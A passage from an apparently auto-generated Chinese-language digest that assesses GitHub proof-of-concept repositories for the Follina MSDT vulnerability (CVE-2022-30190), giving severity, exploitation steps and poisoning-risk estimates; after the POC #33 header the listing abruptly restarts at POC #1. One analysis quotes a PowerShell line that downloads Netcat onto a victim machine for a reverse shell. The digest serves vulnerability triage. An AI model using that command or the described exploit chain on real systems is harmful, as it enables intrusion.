投毒风险评估为10%，因为无法直接从提供的代码判断是否存在恶意代码，但说明该仓库可能用于恶意目的。

**利用方式:**
1.  攻击者创建一个包含恶意链接或嵌入对象的文档（例如Word文档）。
2.  当受害者打开该文档时，MSDT通过URL协议被调用。
3.  MSDT执行攻击者指定的恶意代码，从而导致远程代码执行。
4.  攻击者可以利用此漏洞安装程序，查看、更改或删除数据，或创建新帐户，具体取决于用户的权限。

**项目地址:** [mattjmillner/CVE-Smackdown](https://github.com/mattjmillner/CVE-Smackdown)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #25

**来源**: [CVE-2022-30190-melting0256_Enterprise-Cybersecurity.md](../2022/CVE-2022-30190-melting0256_Enterprise-Cybersecurity.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可以执行任意代码，控制受影响的系统

**影响版本:** 受影响的Windows版本众多，详情见漏洞库信息

**利用条件:** 需要用户打开包含恶意链接或文件的应用程序（如Word）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过利用URL协议从调用应用程序（例如Word）调用MSDT来触发此漏洞。攻击者可以创建一个包含恶意链接或文件的应用程序（例如Word文档），当用户打开该文件时，MSDT将被调用并执行攻击者指定的任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断此漏洞的POC代码是有效的。搜索引擎结果中包含了大量关于此漏洞的分析、利用和修复信息，证明了该漏洞的真实性和危害性。提供的Python脚本（follina.py）能够生成包含恶意代码的Word文档，该文档在被打开时可以触发MSDT并执行攻击者指定的命令。

**投毒风险：**
POC代码中存在一定程度的投毒风险。虽然该代码的主要目的是为了验证漏洞的存在和利用方式，但攻击者可以很容易地修改该代码，使其包含恶意功能，例如：

1.  **恶意命令执行：** `command` 参数允许攻击者指定要在目标系统上执行的任意命令。如果用户不小心使用了包含恶意命令的POC代码，可能会导致系统受到损害。
2.  **反向Shell：** `--reverse` 参数允许攻击者在目标系统上创建一个反向Shell，从而可以远程控制该系统。这是一种非常危险的功能，可能会导致严重的安全问题。
3. **下载恶意可执行文件**: POC代码中会尝试从Github下载nc.exe，github连接可能会指向其他恶意地址，从而下载恶意可执行文件

综合来看，该POC代码的投毒风险约为10%，主要来自于可能被篡改的命令和潜在的恶意链接。

**利用方式：**
此漏洞的利用方式如下：

1.  **生成恶意Word文档：** 使用提供的Python脚本（follina.py）生成包含恶意链接的Word文档。该脚本会创建一个临时的HTTP服务器，用于托管一个包含MSDT协议处理程序的HTML文件。
2.  **诱骗用户打开文档：** 通过电子邮件、社交媒体或其他方式，诱骗目标用户打开恶意Word文档。
3.  **触发漏洞：** 当用户打开Word文档时，Word会尝试加载HTML文件。HTML文件中的MSDT协议处理程序会被触发，导致MSDT执行攻击者指定的命令。
4.  **执行任意代码：** 攻击者可以利用此漏洞在目标系统上执行任意代码，例如安装恶意软件、窃取敏感数据或控制系统。

总而言之，CVE-2022-30190是一个高危漏洞，攻击者可以利用它在受影响的系统上执行任意代码。用户应尽快采取必要的安全措施，例如安装补丁或禁用MSDT协议处理程序，以防止受到攻击。

**项目地址:** [melting0256/Enterprise-Cybersecurity](https://github.com/melting0256/Enterprise-Cybersecurity)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #26

**来源**: [CVE-2022-30190-michealadams30_Cve-2022-30190.md](../2022/CVE-2022-30190-michealadams30_Cve-2022-30190.md)

## CVE-2022-30190-Microsoft MSDT RCE-Follina

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码，控制系统。

**影响版本:** 见漏洞库信息

**利用条件:** 需要用户打开恶意构造的文档或点击恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个Microsoft Office漏洞，攻击者通过Word等程序调用MSDT，并利用URL协议从远程Web服务器检索HTML文件。该HTML文件包含恶意代码，从而在受害者系统上执行任意命令。漏洞利用涉及诱使用户打开恶意构造的文档（例如，通过电子邮件附件）。

**有效性：**
提供的Python POC代码看起来是有效的，它生成恶意文档或利用方式，并设置一个Web服务器来托管payload。代码包含从用户收集必要信息（如目标IP、端口、文件扩展名等）的部分，并创建所需的文件结构，表明具有利用该漏洞的能力。

**投毒风险：**
代码中可能存在投毒风险。虽然代码的主要功能是生成漏洞利用所需的文件，但攻击者可能在以下方面进行投毒：

*   **Web服务器payload：** 托管在Web服务器上的实际payload可能包含恶意代码，不仅执行预期的命令，还执行其他恶意操作，例如安装后门、窃取敏感信息等。
*   **生成的文档：**  生成的文档本身可能包含超出漏洞利用范围的恶意内容。

因此，存在一定风险，但代码整体结构看似为生成漏洞利用文件，投毒风险较低，预估投毒风险为10%。

**利用方式：**
1.  攻击者创建一个恶意构造的Word文档（或其他支持的文档类型）。
2.  该文档包含一个链接或引用，指向攻击者控制的Web服务器上的一个HTML文件。
3.  当用户打开该文档时，Word会尝试通过MSDT和URL协议检索该HTML文件。
4.  恶意HTML文件包含执行任意代码的payload。
5.  该payload在受害者系统上执行，从而允许攻击者控制系统。

**项目地址:** [michealadams30/Cve-2022-30190](https://github.com/michealadams30/Cve-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #27

**来源**: [CVE-2022-30190-seinab-ibrahim_Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis.md](../2022/CVE-2022-30190-seinab-ibrahim_Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis.md)

## CVE-2022-30190 (Follina) Microsoft MSDT 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本包括但不限于Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022

**利用条件:** 需要用户打开恶意构造的文档或URL，且MSDT需要被调用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。 

**有效性评估：**
根据漏洞库信息和搜索结果，此漏洞已得到确认，并且存在公开可用的PoC（Proof of Concept）代码。 搜索结果显示该漏洞被广泛讨论和利用，因此可以判断提供的PoC代码是有效的。 尽管提供的`README.md`文件仅仅是描述性的，但意味着完整的仓库中包含可利用的POC代码

**投毒风险分析：**
提供的漏洞利用代码只是一个 `README.md` 文件，主要描述了漏洞的分析和利用。 由于仅仅是描述性文件，无法从中直接判断是否存在投毒代码。但如果完整的仓库中存在其他恶意脚本，例如伪装成正常利用代码的后门，则存在投毒风险。根据文件内容，倾向于是一个教学和研究项目，投毒的可能性较低，因此判断投毒风险约为 10%。

**利用方式：**
1.  攻击者利用Microsoft Office (例如Word) 的远程模板功能。
2.  构造一个包含恶意链接的文档，该链接指向一个远程Web服务器。
3.  当用户打开该文档时，Word会从远程Web服务器检索HTML文件。
4.  该HTML文件包含恶意的MSDT协议URL，用于调用MSDT。
5.  MSDT被调用时，会执行攻击者预设的任意代码，从而实现远程代码执行。

**总结：**
CVE-2022-30190 (Follina) 是一个高危漏洞，利用简单，影响范围广。攻击者可以通过诱使用户打开恶意文档或URL来触发该漏洞。虽然提供的PoC文件本身不包含恶意代码，但仍需谨慎使用，并确保从可信来源获取完整的PoC代码。

**项目地址:** [seinab-ibrahim/Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis](https://github.com/seinab-ibrahim/Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #28

**来源**: [CVE-2022-30190-shri142_ZipScan.md](../2022/CVE-2022-30190-shri142_ZipScan.md)

## CVE-2022-30190 (Follina) MSDT 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码，可能导致系统完全控制

**影响版本:** 受影响的Windows版本众多，具体版本范围请参考漏洞库信息

**利用条件:** 用户需要打开恶意构造的文档（如Word文档），或者点击恶意链接。调用程序（如Word）需要存在漏洞影响版本中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。当 MSDT 被调用应用程序（如 Word）使用 URL 协议调用时，就会出现此漏洞。攻击者可以构造恶意的 Word 文档，该文档利用 Word 的远程模板功能从远程 Web 服务器检索 HTML 文件。此 HTML 文件包含一个使用 `ms-msdt` 协议处理方案的恶意 JavaScript 代码，可以执行任意代码。

**漏洞利用方式:**
1.  攻击者创建一个包含恶意链接或嵌入恶意HTML的Word文档。
2.  受害者打开该文档。
3.  Word尝试从远程服务器加载HTML模板。
4.  远程HTML利用`ms-msdt`协议调用MSDT。
5.  MSDT执行HTML中嵌入的恶意代码，从而在受害者系统上执行任意命令。

**有效性:**
提供的代码是一个扫描器，用于检测文件中是否存在 Follina 漏洞。 它不是漏洞利用代码，而是用于分析文件是否包含该漏洞的特征。

**投毒风险:**
提供的 Go 代码主要功能是扫描文件，检测是否存在 CVE-2022-30190 (Follina) 漏洞的特征。代码本身包含一定的投毒风险的可能性，因为扫描器本身可能被利用来传播恶意文件，虽然扫描器本身功能没有直接执行恶意代码，但仍然存在潜在的风险：

1.  **依赖包风险:** 检查 `go.mod` 和 `go.sum` 文件，确认所有依赖包的来源是否可信，以及版本是否安全。恶意依赖包可能会引入漏洞或后门。
2.  **扫描逻辑缺陷:** 扫描逻辑中可能存在缺陷，导致误报或漏报。攻击者可能利用这些缺陷来隐藏恶意代码，绕过扫描器的检测。
3.  **供应链攻击:** 攻击者可能篡改代码仓库，在扫描器中植入恶意代码。用户下载并运行被篡改的扫描器后，可能会受到攻击。
4.  **代码执行环境风险:** 运行扫描器的环境可能存在安全漏洞。攻击者可能利用这些漏洞来提升权限，执行恶意代码。

虽然代码的主要目的是安全扫描，但由于软件开发和分发的复杂性，仍然存在一定的风险。使用者应当保持警惕，确保从可信的来源获取代码，并进行充分的安全审查。

风险评估：10% 风险可能性体现在扫描器可能被恶意利用或包含隐藏的漏洞，但主要功能是扫描而非攻击，因此投毒风险较低。

**项目地址:** [shri142/ZipScan](https://github.com/shri142/ZipScan)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #29

**来源**: [CVE-2022-30190-skitkat_CVE-2022-30190-POC.md](../2022/CVE-2022-30190-skitkat_CVE-2022-30190-POC.md)

## CVE-2022-30190 - Microsoft MSDT Follina 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可利用该漏洞在目标系统上执行任意代码

**影响版本:** 受影响的版本包括Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022等，具体版本范围见漏洞库信息。

**利用条件:** 需要用户打开包含恶意链接或文件的文档，例如Word文档。 或者通过其他调用程序触发MSDT。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT)中的远程代码执行漏洞。攻击者可以通过诱使用户打开特制的文档(例如Word文档)来触发该漏洞。该文档利用Word的远程模板功能从远程服务器检索HTML文件，其中包含恶意代码。当MSDT被调用并使用URL协议时，就会触发此漏洞，允许攻击者以调用应用程序的权限执行任意代码。这可能导致安装程序、查看/更改/删除数据或创建新帐户。

**漏洞利用方式：**
1.  攻击者创建一个包含恶意代码的Word文档或其他支持远程模板的文档。
2.  该文档包含一个指向攻击者控制的远程服务器的链接，该服务器托管一个包含恶意HTML代码的文件。
3.  当用户打开该文档时，Word会从远程服务器下载HTML文件。
4.  HTML文件中的恶意代码使用`ms-msdt:`协议调用MSDT，并传递恶意参数。
5.  MSDT解析恶意参数并执行攻击者指定的代码。

**有效性：**
根据搜索结果和漏洞库信息，该漏洞已被积极利用，并且存在公开的POC代码。
提供的Cargo.lock文件只是Rust项目的依赖锁文件，本身不包含漏洞利用代码，不能直接验证漏洞是否有效。但该文件表明该项目可能与该漏洞的利用有关，需要进一步分析项目源代码才能确定。

**投毒风险：**
Cargo.lock文件本身不包含可执行代码，因此直接通过该文件进行投毒的可能性较低。但是，如果该项目包含恶意构建脚本或者依赖了被投毒的第三方库，则可能存在投毒风险。初步判断该仓库存在一定比例的投毒风险，约10%，需要进一步分析项目源代码，检查是否存在以下情况：
*   构建脚本中是否包含恶意代码。
*   依赖项中是否存在已知被投毒的库。
*   是否存在其他可疑的文件或代码。

需要强调的是，在未对整个代码库进行彻底审查的情况下，无法完全排除投毒风险。

**项目地址:** [skitkat/CVE-2022-30190-POC](https://github.com/skitkat/CVE-2022-30190-POC)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #30

**来源**: [CVE-2022-30190-swaiist_CVE-2022-30190-Fix.md](../2022/CVE-2022-30190-swaiist_CVE-2022-30190-Fix.md)

## CVE-2022-30190-MSDT远程代码执行

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能允许攻击者在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本，详见漏洞库信息

**利用条件:** 用户需要打开包含恶意链接或文件的文档

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-30190（又名Follina）是一个远程代码执行漏洞，存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中。攻击者可以利用此漏洞通过精心构造的恶意文档（例如Word文档）或通过URL协议调用MSDT来执行任意代码。当用户打开包含恶意链接或文件的文档时，该漏洞会被触发。根据搜索结果，攻击者利用Word的远程模板功能从远程服务器检索HTML文件，然后利用MSDT执行代码。提供的PoC代码中，execute.bat脚本首先备份 `HKEY_CLASSES_ROOT\ms-msdt` 注册表项到桌面上的`backup-for-msdt`文件中，然后删除该注册表项。restore.bat脚本则将备份的注册表项导入回来。这两个脚本本身并不会执行任何恶意代码，而是用于删除和恢复MSDT的注册表关联，通常是利用流程的一部分，用于绕过某些缓解措施或用于测试。因此，仓库本身提供的PoC代码没有发现作者隐藏的投毒代码。

**有效性：**
根据漏洞描述和搜索结果，以及PoC涉及的操作，该PoC代码是漏洞利用链的一部分，主要用于修改MSDT的注册表关联。结合其他步骤（例如，通过Word远程模板下载恶意HTML），可以实现远程代码执行。

**利用方式：**
1.  攻击者创建一个包含恶意链接或嵌入恶意OLE对象的文档（例如Word文档）。
2.  当用户打开文档时，Word会尝试从远程服务器加载HTML文件（通过远程模板功能）。
3.  恶意HTML文件利用`ms-msdt:` URL协议调用MSDT。
4.  MSDT被触发，执行HTML文件中包含的恶意代码。
5.  攻击者可以利用该漏洞在受害者系统上执行任意命令。  提供的PoC 代码中的`execute.bat` 通过删除`HKEY_CLASSES_ROOT\ms-msdt` 注册表关联，在恢复前，可能允许攻击者控制MSDT的行为或执行流程。`restore.bat`脚本用于恢复该关联，在攻击之后清理环境。

**投毒风险评估：**
PoC 代码本身主要用于注册表操作，没有发现明显的恶意代码。但是，由于PoC通常需要结合其他恶意文件（例如HTML或Word文档）才能完成攻击，因此，投毒风险主要存在于这些其他组件中。但是仅从提供的bat文件来判断，投毒风险较低。

**项目地址:** [swaiist/CVE-2022-30190-Fix](https://github.com/swaiist/CVE-2022-30190-Fix)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #31

**来源**: [CVE-2022-30190-winstxnhdw_CVE-2022-30190.md](../2022/CVE-2022-30190-winstxnhdw_CVE-2022-30190.md)

## CVE-2022-30190 (Follina) MSDT 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本包括Windows 7到Windows 11以及多个Windows Server版本，具体版本范围参考漏洞库信息。

**利用条件:** 需要用户打开包含恶意代码的文档（如Word文档），或者访问包含恶意链接的网页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以利用此漏洞，通过构造恶意的Word文档或其他方式，诱使用户打开，从而在用户系统上执行任意代码。 

**有效性评估：**

根据漏洞库信息和搜索结果，此漏洞在野外被广泛利用，POC代码的存在进一步证明了其有效性。提供的PoC代码描述了如何生成一个包含恶意链接的Word文档，当用户打开此文档时，MSDT会被调用，执行攻击者预先设定的恶意代码。

**投毒风险评估：**

分析提供的PoC代码，投毒风险较低，约为10%。主要风险点可能存在于以下几个方面：

1.  **init.py:** 该脚本用于构建恶意Word文档和初始化攻击者服务器。代码本身没有明显的恶意行为，但如果`build_payload`函数中的powershell命令被替换为更具破坏性的命令，则可能导致更严重的后果。
2.  **config.xml:** 该配置文件定义了攻击者服务器的主机名和端口。如果攻击者将此值更改为指向恶意服务器，则可能导致受害者下载和执行恶意软件。
3.  **build/href.txt:** 该文件包含用于触发漏洞的HTML代码。攻击者可能会修改此文件，以执行其他恶意操作。

但是，总体而言，提供的PoC代码主要用于演示漏洞，而不是用于传播恶意软件。 `destroy_all.bat`脚本的存在也一定程度上降低了风险，因为该脚本可以帮助用户删除所有相关文件。

**利用方式分析：**

1.  攻击者首先编辑`config.xml`，设置攻击者服务器的hostname和port。
2.  运行`dotnet publish LocalEXF`编译payload。
3.  运行`init.py`脚本，该脚本会：
    *   构建包含恶意链接的Word文档（trojan.docx）。
    *   在攻击者服务器上托管一个包含恶意Payload的HTML文件。
    *   base64 编码 PowerShell 命令。
4.  攻击者将此Word文档发送给受害者。
5.  受害者打开Word文档，MSDT会被调用，执行攻击者服务器上托管的Payload，从而在受害者系统上执行任意代码。

需要注意的是，要成功利用此漏洞，受害者需要卸载安全更新KB5016616，并且命令运行时间要短，否则会出现故障排除程序。


**项目地址:** [winstxnhdw/CVE-2022-30190](https://github.com/winstxnhdw/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #32

**来源**: [CVE-2022-30190-yeep1115_ICT287_CVE-2022-30190_Exploit.md](../2022/CVE-2022-30190-yeep1115_ICT287_CVE-2022-30190_Exploit.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本和Office版本见漏洞库信息

**利用条件:** 需要用户打开恶意Word文档

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个远程代码执行漏洞，存在于Microsoft Windows Support Diagnostic Tool (MSDT)中。攻击者可以利用此漏洞通过特制的Word文档，使用Word的远程模板功能从远程Web服务器检索HTML文件，从而在受害者系统上执行任意代码。

**有效性：** 根据漏洞信息、搜索结果和提供的POC代码，该漏洞利用是有效的。漏洞库信息和搜索结果都表明这是一个真实存在的、被广泛利用的漏洞。POC代码（虽然只是一个README.md文件）指向了一个实际的利用项目，说明了利用方式和受影响的系统版本，证明了漏洞的可利用性。

**投毒风险：** 分析提供的仓库内容，风险评估如下：

*   **README.md文件：** 本身不包含任何可执行代码，因此直接的投毒风险较低。
*   **外部链接：**  主要风险在于指向的`Hrishikesh7665/Follina_Exploiter_CLI`仓库。虽然原作者注明了License，但是仍然存在投毒的可能性。

综合分析，考虑到代码仓库可能存在恶意修改的风险，虽然直接投毒可能性较低，但间接风险不可忽视，因此评估投毒风险为10%。

**利用方式：** 漏洞的利用方式通常包括以下步骤：

1.  **构造恶意Word文档：** 攻击者创建一个包含恶意链接的Word文档。该链接指向一个由攻击者控制的远程Web服务器，并使用`ms-msdt:` URL协议调用MSDT。
2.  **诱骗受害者打开文档：** 攻击者通过电子邮件、社交媒体或其他方式将恶意文档发送给受害者。
3.  **执行恶意代码：** 当受害者打开文档时，Word会尝试从远程服务器检索HTML文件。该HTML文件包含恶意JavaScript代码，该代码利用MSDT执行任意命令。
4.  **控制系统：** 通过执行的命令，攻击者可以在受害者系统上安装恶意软件、窃取数据或执行其他恶意活动。

**项目地址:** [yeep1115/ICT287_CVE-2022-30190_Exploit](https://github.com/yeep1115/ICT287_CVE-2022-30190_Exploit)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #33

**来源**: [CVE-2022-30190-yrkuo_CVE-2022-30190.md](../2022/CVE-2022-30190-yrkuo_CVE-2022-30190.md)

# CVE-2022-30190

> 📦 该CVE有 **33** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-30190-AbdulRKB_Follina.md](../2022/CVE-2022-30190-AbdulRKB_Follina.md)

## CVE-2022-30190 - Microsoft MSDT RCE (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，完全控制受害者系统

**影响版本:** 见漏洞库信息中受影响的版本

**利用条件:** 用户需要打开恶意构造的文档（例如 Word 文档）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190 (Follina) 是一个 Microsoft Office 中的远程代码执行漏洞，当 MSDT 通过 URL 协议从调用应用程序（如 Word）调用时，会触发此漏洞。攻击者可以利用 Word 的远程模板功能从远程 Web 服务器检索 HTML 文件。该HTML文件中包含恶意的JavaScript代码，该代码使用`ms-msdt:`协议调用MSDT，从而执行任意命令。

**利用方式:**

1.  **恶意文档制作:** 攻击者创建一个恶意的 Word 文档，该文档包含指向远程 Web 服务器的链接，该服务器托管着包含恶意 JavaScript 代码的 HTML 文件。
2.  **HTTP服务器:** 攻击者搭建一个 HTTP 服务器，用于托管恶意的 HTML 文件，该文件利用 `ms-msdt:` 协议执行命令。
3.  **诱骗用户打开文档:** 攻击者通过鱼叉式网络钓鱼等方式诱骗受害者打开恶意 Word 文档。
4.  **远程代码执行:** 当用户打开文档时，Word 会从远程服务器检索 HTML 文件，并执行其中的恶意 JavaScript 代码，从而触发 MSDT 并执行攻击者预设的命令。

**POC代码分析:**

提供的 POC 代码 `main.py` 脚本的功能如下:

*   **创建恶意文档：** 该脚本会修改 Word 文档的 `_rels/document.xml.rels` 文件，插入一个指向攻击者控制的 HTTP 服务器的链接。当用户打开该文档时，Word 会尝试从该链接下载 HTML 文件。
*   **启动 HTTP 服务器：** 该脚本会在指定的端口启动一个 HTTP 服务器，用于托管包含恶意 JavaScript 代码的 HTML 文件。该 HTML 文件使用 `ms-msdt:` 协议执行命令。
*   **启动 Netcat 监听器：** 该脚本会启动一个 Netcat 监听器，等待受害者机器反弹 shell。

**投毒风险分析:**

分析POC代码，发现以下潜在的投毒风险点:

*   **硬编码的下载地址：**  `Invoke-WebRequest https://github.com/CyberTitus/Follina/raw/main/nc64.exe -OutFile C:\Windows\Tasks\nc.exe`  这行代码从GitHub下载 `nc64.exe`  (Netcat) 到受害者机器。攻击者可能替换 CyberTitus 仓库中的 `nc64.exe` 文件，导致受害者下载恶意的 Netcat 版本或其他恶意程序。
*   **命令混淆与执行:** 恶意命令通过base64编码后执行，具有一定的隐藏性。如果攻击者将命令修改为具有破坏性的操作，则会存在较高的安全风险。
*   **Shell反弹地址:**虽然IP由用户输入，但代码逻辑存在被篡改的风险，从而反弹Shell到攻击者指定的地址。

**有效性:**

根据漏洞库信息、搜索引擎结果以及提供的 POC 代码，该漏洞利用的有效性较高。该漏洞在野外被广泛利用，且 POC 代码能够成功触发漏洞并实现远程代码执行。

**项目地址:** [AbdulRKB/Follina](https://github.com/AbdulRKB/Follina)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #2

**来源**: [CVE-2022-30190-Arkha-Corvus_LetsDefend-SOC173-Follina-0-Day-Detected.md](../2022/CVE-2022-30190-Arkha-Corvus_LetsDefend-SOC173-Follina-0-Day-Detected.md)

## CVE-2022-30190 - Microsoft MSDT 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可导致远程代码执行，权限提升

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 用户打开恶意Word文档

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

该漏洞允许攻击者通过特制的Office文档，利用`ms-msdt:`协议调用MSDT执行任意命令。攻击者可以通过嵌入恶意URL到Word文档中，诱导用户点击或者预览，从而触发漏洞。漏洞利用流程如下：

1.  攻击者创建一个包含恶意链接的Word文档。
2.  用户打开该文档。
3.  文档利用`ms-msdt:`协议调用MSDT。
4.  MSDT执行攻击者指定的命令。

根据提供的漏洞利用代码分析，这是一个对 Follina 漏洞的案例研究，通过分析恶意Word文档触发 `msdt.exe` 的执行，从而实现远程代码执行。

**有效性：** 提供的Github仓库包含对漏洞的分析和利用过程，可以有效帮助理解漏洞原理。

**投毒风险：** 该存储库是一个案例分析，主要包含漏洞分析和利用过程的记录，包括文件哈希、网络流量分析和电子邮件分析。代码中没有发现明显的恶意后门代码，投毒的可能性较低（约5%），主要是考虑到作者可能在分析过程中引入了一些未知的或者不安全的操作，但从整体上看，这是一个漏洞分析的记录，投毒的可能性不大。

**利用方式：**

1.  **构造恶意Word文档：** 攻击者构造包含恶意`ms-msdt:` URL的Word文档。
2.  **传播恶意文档：** 攻击者通过钓鱼邮件等方式将恶意文档发送给目标用户。
3.  **触发漏洞：** 用户打开恶意文档，触发MSDT执行恶意代码。
4.  **执行恶意命令：** 攻击者利用MSDT执行任意命令，例如安装恶意软件，窃取数据等。

**建议：**

*   及时安装微软发布的补丁。
*   禁用`ms-msdt:`协议，作为缓解措施。
*   加强用户安全意识培训，避免打开来源不明的文档。
*   使用杀毒软件和入侵检测系统，及时发现和阻止恶意攻击。

**项目地址:** [Arkha-Corvus/LetsDefend-SOC173-Follina-0-Day-Detected](https://github.com/Arkha-Corvus/LetsDefend-SOC173-Follina-0-Day-Detected)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #3

**来源**: [CVE-2022-30190-Cosmo121_Follina-Remediation.md](../2022/CVE-2022-30190-Cosmo121_Follina-Remediation.md)

## CVE-2022-30190 - Microsoft MSDT "Follina" 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 见漏洞库信息中的受影响版本列表

**利用条件:** 需要用户打开恶意文档(如Word)或点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-30190 (Follina) 是一个存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以利用 Word 等调用应用程序，通过 URL 协议调用 MSDT，从而执行任意代码。利用方式通常是攻击者制作包含恶意代码的 Word 文档，该文档利用 Word 远程模板功能从远程 Web 服务器检索 HTML 文件，该 HTML 文件包含触发 MSDT 漏洞的代码，最终导致命令执行。

根据漏洞库信息，大量Windows版本都受到影响。搜索结果也证实了该漏洞的严重性，并提供了相关的利用和检测信息。提供的代码片段仅仅是GPL协议的License文件，并非POC代码，因此无法根据此代码判断投毒风险,需要验证是否存在后门。

由于提供的代码片段仅仅是GPL协议内容，无法判断实际的POC代码。根据搜索结果和漏洞描述，此漏洞的有效性高，因为在野外已经被利用。

**项目地址:** [Cosmo121/Follina-Remediation](https://github.com/Cosmo121/Follina-Remediation)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #4

**来源**: [CVE-2022-30190-DerZiad_CVE-2022-30190.md](../2022/CVE-2022-30190-DerZiad_CVE-2022-30190.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码，可能导致系统完全控制

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 需要用户打开包含恶意代码的文档，例如Word文档

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

